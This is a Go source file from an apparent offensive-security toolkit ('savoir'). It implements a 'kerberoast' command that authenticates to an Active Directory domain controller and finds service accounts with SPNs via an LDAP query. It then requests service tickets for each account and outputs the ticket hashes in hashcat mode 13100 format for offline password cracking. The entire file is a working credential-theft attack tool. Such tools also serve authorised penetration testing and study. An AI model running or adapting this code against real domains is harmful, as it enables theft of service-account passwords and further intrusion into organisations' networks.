package kerberos

import (
	"fmt"
	"os"
	"strings"

	"github.com/spf13/cobra"
	"github.com/vincd/savoir/modules/paquet/krb5"
	"github.com/vincd/savoir/modules/paquet/ldap"
)

type spnTarget struct {
	username string
	spn      string
}

func init() {
	var domain string
	var dcIp string
	var useLdap bool
	var ldapUser string
	var ldapPassword string
	var ldapSizeLimit int
	var enctype string
	var username string
	var password string
	var ticket string
	var key string
	var spn string
	var outputFile string

	var kerberoastCmd = &cobra.Command{
		Use:   "kerberoast",
		Short: "Perform a Kerberoasting attack against specified user(s)",
		Long:  `Perform a Kerberoasting attack against specified user(s)`,
		PreRunE: func(cmd *cobra.Command, args []string) error {
			if err := validateDomainUserFlagsWithTicket(username, password, key, ticket); err != nil {
				return err
			}

			if err := validateETypeFlag(enctype); err != nil {
				return err
			}

			if len(spn) > 0 && useLdap {
				return fmt.Errorf("flags --spn and --ldap cannot be set in the same command")
			}

			// We check here if the user want to use the same credentials for LDAP.
			// We don't support LDAP authentication with a ticket and key yet.
			if len(ldapUser) > 0 || len(ldapPassword) > 0 {
				useLdap = true
			}

			if useLdap && len(username) > 0 && len(ldapUser) == 0 {
				fmt.Printf("[*] Use %s as LDAP username\n", username)
				ldapUser = username
			}

			if useLdap && len(password) > 0 && len(ldapPassword) == 0 {
				// Don't print the password...
				fmt.Printf("[*] Use %s password as LDAP password\n", username)
				ldapPassword = password
			}

			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			printDomainInformation(domain, dcIp)

			var tgtCred *krb5.KRBCred
			targets := make([]spnTarget, 0)

			if len(ticket) > 0 {
				fmt.Printf("[*] Use a kirbi file as credentials\n")
				kirbi, err := krb5.NewKrbCredFromFile(ticket)
				if err != nil {
					return fmt.Errorf("cannot load kirbi: %s", err)
				}

				tgtCred = kirbi
			} else {
				fmt.Printf("[*] Use LDAP to retreive vulnerable accounts\n")
				keyBytes, err := getKeyFlagValue(key)
				if err != nil {
					return err
				}

				fmt.Printf("[*] Use username and password/key as credentials to request a TGT\n")
				tgt, err := krb5.AskTGT(domain, username, password, keyBytes, getETypeFromFlagValue(enctype), dcIp, false, false)
				if err != nil {
					return fmt.Errorf("cannot ask TGT: %s", err)
				}

				tgtCred = tgt.Credentials()
			}

			if len(spn) > 0 {
				fmt.Printf("[*] Keberoast SPN %s\n", spn)
				targets = append(targets, spnTarget{username: "USER", spn: spn})
			} else if useLdap {
				ldapClient, err := ldap.NewLDAPClient()
				if err != nil {
					return err
				}

				// TODO : support LDAPS
				if err := ldapClient.Connect(dcIp, 389); err != nil {
					return err
				}
				defer ldapClient.Close()

				// We set the correct credentials in the `PreRunE` function
				if err := ldapClient.AuthenticateWithDomainAccount(domain, ldapUser, ldapPassword); err != nil {
					return err
				}

				// TODO: search account with RC4 enabled (or AES128/256)
				query := "(&(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))"
				entries, err := ldapClient.SearchWithSizeLimit(query, []string{"sAMAccountName", "servicePrincipalName", "distinguishedName"}, 1000)
				if err != nil {
					return err
				}

				if len(entries) == 0 {
					fmt.Printf("[!] No user to Kerberoast found in LDAP\n")
					return nil
				}

				fmt.Printf("[*] Found %d users to Kerberoast found in LDAP\n", len(entries))
				for _, entry := range entries {
					fmt.Printf("[*] %s\n", entry["dn"])
					fmt.Printf("    sAMAccountName      : %s\n", entry["sAMAccountName"])
					fmt.Printf("    distinguishedName   : %s\n", entry["distinguishedName"])
					fmt.Printf("    servicePrincipalName: %s\n", entry["servicePrincipalName"])

					targets = append(targets, spnTarget{username: entry["sAMAccountName"][0], spn: entry["servicePrincipalName"][0]})
				}
			}

			hashes := ""
			for _, target := range targets {
				// TODO: compute the correct NameType and NamString
				principalName := krb5.PrincipalName{
					NameType:   krb5.KRB_NT_SRV_INST,
					NameString: strings.Split(target.spn, "/"),
				}

				fmt.Printf("[*] Asking TGS for principal: %s\n", target.spn)
				tgs, err := krb5.AskTGSWithKirbi(domain, principalName, tgtCred, dcIp)
				if err != nil {
					fmt.Printf("Cannot ask TGS for principal %s: %s", target.spn, err)
				}

				hashes += fmt.Sprintf("%s\n", tgs.HashString(target.username, target.spn))
			}

			if len(outputFile) == 0 {
				fmt.Printf("[*] Hashes:\n%s\n", hashes)
			} else {
				f, err := os.Create(outputFile)
				if err != nil {
					return fmt.Errorf("cannot create hash file: %s", err)
				}
				defer f.Close()

				f.Write([]byte(hashes))
				fmt.Printf("[*] Save hashes to: %s\n", outputFile)
			}

			return nil
		},
	}

	commandAddKerberosDomainFlags(kerberoastCmd, &domain, &dcIp)
	commandAddDomainUserFlagsWithTicket(kerberoastCmd, &username, &password, &key, &ticket)
	kerberoastCmd.Flags().BoolVarP(&useLdap, "ldap", "l", false, "Search targets on LDAP with username and password")
	commandAddLDAPFlags(kerberoastCmd, &ldapUser, &ldapPassword, &ldapSizeLimit)
	commandAddKerberosETypeFlagWithDefaultValue(kerberoastCmd, &enctype, "rc4")
	kerberoastCmd.Flags().StringVarP(&spn, "spn", "", "", "SPN to roast")
	kerberoastCmd.Flags().StringVarP(&outputFile, "output", "o", "", "Output the hashes to a file (hashcat mode 13100)")

	Command.AddCommand(kerberoastCmd)
}
